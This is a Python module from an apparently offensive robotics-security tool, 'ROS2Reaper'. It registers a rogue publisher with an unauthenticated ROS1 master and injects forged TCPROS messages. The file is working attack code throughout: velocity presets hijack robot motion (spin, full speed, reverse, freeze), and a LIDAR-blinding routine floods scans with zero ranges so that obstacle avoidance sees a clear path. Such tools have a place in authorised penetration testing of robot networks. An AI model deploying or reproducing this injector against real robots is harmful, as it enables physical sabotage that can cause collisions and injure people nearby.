#!/usr/bin/env python3
"""
ros1_injection.py — ROS1 TCPROS Topic Injection
================================================
Registers as a ROS1 publisher via rosmaster and injects serialised
messages directly to subscribers over TCPROS.

Attack flow:
  1. Register as publisher with rosmaster (unauthenticated XML-RPC)
  2. Start a TCPROSPublisher TCP server — subscribers connect to us
  3. Perform the TCPROS header handshake with each subscriber
  4. Send malicious messages at the specified rate for the duration
  5. Unregister from rosmaster on exit

No ROS1 installation required on the attacker — only standard Python.

Supported injection targets:
  cmd_vel   — geometry_msgs/Twist   (robot motion hijack)
  scan      — sensor_msgs/LaserScan  (LIDAR blinding)

Author: Gh057x
"""

import json
import socket
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

from core.ros1_master import ROS1MasterClient
from core.ros1_transport import TCPROSPublisher, TCPROSSerializer


# ---------------------------------------------------------------------------
# Attack presets for cmd_vel injection
# ---------------------------------------------------------------------------

CMD_VEL_PRESETS: Dict[str, Dict[str, float]] = {
    "spin":      {"lx": 0.0,  "az": 3.14},   # Spin in place
    "spinout":   {"lx": 0.5,  "az": 3.14},   # Forward + spin
    "fullspeed": {"lx": 2.0,  "az": 0.0},    # Max forward
    "reverse":   {"lx": -2.0, "az": 0.0},    # Max reverse
    "estop":     {"lx": 0.0,  "az": 0.0},    # Emergency stop (freeze)
    "erratic":   {"lx": 1.0,  "az": 2.0},    # Chaotic movement
    "circle":    {"lx": 0.3,  "az": 0.8},    # Tight circle
}


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass
class InjectionResult:
    attack_type: str
    topic: str
    target_master: str
    start_time: str
    end_time: str = ""
    messages_sent: int = 0
    subscribers_reached: int = 0
    success: bool = False
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type,
            "topic": self.topic,
            "target_master": self.target_master,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "messages_sent": self.messages_sent,
            "subscribers_reached": self.subscribers_reached,
            "success": self.success,
            "notes": self.notes,
        }


# ---------------------------------------------------------------------------
# Injector
# ---------------------------------------------------------------------------

class ROS1Injector:
    """
    TCPROS topic injector for ROS1 deployments.

    Example:
        inj = ROS1Injector("192.168.1.10", verbose=True)
        inj.inject_cmd_vel("/cmd_vel", preset="spin", duration=10.0)
    """

    def __init__(
        self,
        master_host: str,
        master_port: int = 11311,
        caller_id: str = "/ros2reaper_pub",
        verbose: bool = False,
    ):
        self.master_host = master_host
        self.master_port = master_port
        self.caller_id = caller_id
        self.verbose = verbose
        self._results: List[InjectionResult] = []

    def _log(self, msg: str):
        if self.verbose:
            print(f"[*] {msg}")

    def _local_ip(self) -> str:
        """Resolve the outbound IP towards the ROS master."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.master_host, self.master_port))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"

    # ------------------------------------------------------------------
    # cmd_vel injection
    # ------------------------------------------------------------------

    def inject_cmd_vel(
        self,
        topic: str = "/cmd_vel",
        preset: str = "spin",
        linear_x: Optional[float] = None,
        angular_z: Optional[float] = None,
        duration: float = 10.0,
        rate_hz: float = 10.0,
    ):
        """
        Publish malicious geometry_msgs/Twist messages to a cmd_vel topic.

        If preset is given, uses CMD_VEL_PRESETS values.
        Explicit linear_x / angular_z override the preset.
        """
        msg_type = "geometry_msgs/Twist"
        params = CMD_VEL_PRESETS.get(preset, CMD_VEL_PRESETS["spin"])
        lx = linear_x if linear_x is not None else params.get("lx", 0.0)
        az = angular_z if angular_z is not None else params.get("az", 3.14)

        result = InjectionResult(
            attack_type=f"cmd_vel:{preset}",
            topic=topic,
            target_master=f"{self.master_host}:{self.master_port}",
            start_time=datetime.now().isoformat(),
        )

        print(f"[*] Injecting {topic} — preset={preset} lx={lx:.2f} az={az:.2f} "
              f"for {duration}s @ {rate_hz}Hz")

        payload = TCPROSSerializer.serialize_twist(lx, 0, 0, 0, 0, az)
        self._run_injection(topic, msg_type, payload, duration, rate_hz, result)
        self._results.append(result)

    # ------------------------------------------------------------------
    # LIDAR blinding
    # ------------------------------------------------------------------

    def inject_lidar_blind(
        self,
        topic: str = "/scan",
        duration: float = 10.0,
        rate_hz: float = 10.0,
        num_readings: int = 360,
    ):
        """
        Flood a LaserScan topic with all-zero ranges to blind the LIDAR.
        The robot's obstacle avoidance will believe the path is clear.
        """
        msg_type = "sensor_msgs/LaserScan"

        result = InjectionResult(
            attack_type="lidar_blind",
            topic=topic,
            target_master=f"{self.master_host}:{self.master_port}",
            start_time=datetime.now().isoformat(),
        )

        print(f"[*] Blinding LIDAR on {topic} for {duration}s @ {rate_hz}Hz")

        payload = TCPROSSerializer.serialize_laser_scan_blind(num_readings)
        self._run_injection(topic, msg_type, payload, duration, rate_hz, result)
        self._results.append(result)

    # ------------------------------------------------------------------
    # Internal injection runner
    # ------------------------------------------------------------------

    def _run_injection(
        self,
        topic: str,
        msg_type: str,
        payload: bytes,
        duration: float,
        rate_hz: float,
        result: InjectionResult,
    ):
        """
        Register with rosmaster, start the TCPROS server, publish for
        duration seconds, then unregister.
        """
        local_ip = self._local_ip()
        pub = TCPROSPublisher(
            topic=topic,
            msg_type=msg_type,
            caller_id=self.caller_id,
            verbose=self.verbose,
        )

        # Start TCP server first so we have a port to register
        pub_ip, pub_port = pub.start(local_ip)
        caller_api = f"http://{pub_ip}:{pub_port}/"

        master = ROS1MasterClient(
            host=self.master_host,
            port=self.master_port,
            caller_id=self.caller_id,
        )

        self._log(f"Registering publisher with rosmaster for {topic}...")
        subscriber_uris = master.register_publisher(topic, msg_type, caller_api)
        if subscriber_uris:
            self._log(f"rosmaster reports {len(subscriber_uris)} subscriber(s)")
        else:
            self._log("No active subscribers reported — waiting for connections")

        # Give subscribers time to connect
        time.sleep(0.5)

        interval = 1.0 / rate_hz
        end_time = time.time() + duration
        sent = 0

        try:
            while time.time() < end_time:
                pub.send_message(payload)
                sent += 1
                if self.verbose and sent % int(rate_hz) == 0:
                    elapsed = duration - (end_time - time.time())
                    print(f"[*] {sent} messages sent ({elapsed:.1f}s elapsed)...")
                time.sleep(interval)
        except KeyboardInterrupt:
            result.notes.append("Interrupted by user")
        finally:
            pub.stop()
            master.unregister_publisher(topic, caller_api)
            self._log("Unregistered from rosmaster")

        result.messages_sent = sent
        result.end_time = datetime.now().isoformat()
        result.success = sent > 0
        result.notes.append(f"Sent {sent} messages over {duration}s")
        print(f"\033[92m[+]\033[0m Injection complete — {sent} messages sent on {topic}")

    # ------------------------------------------------------------------

    def export_results(self, filepath: str):
        """Export injection results to JSON."""
        data = {
            "tool": "ROS2Reaper",
            "module": "ros1_injection",
            "timestamp": datetime.now().isoformat(),
            "results": [r.to_dict() for r in self._results],
        }
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2, default=str)
        print(f"[*] Injection results saved to {filepath}")
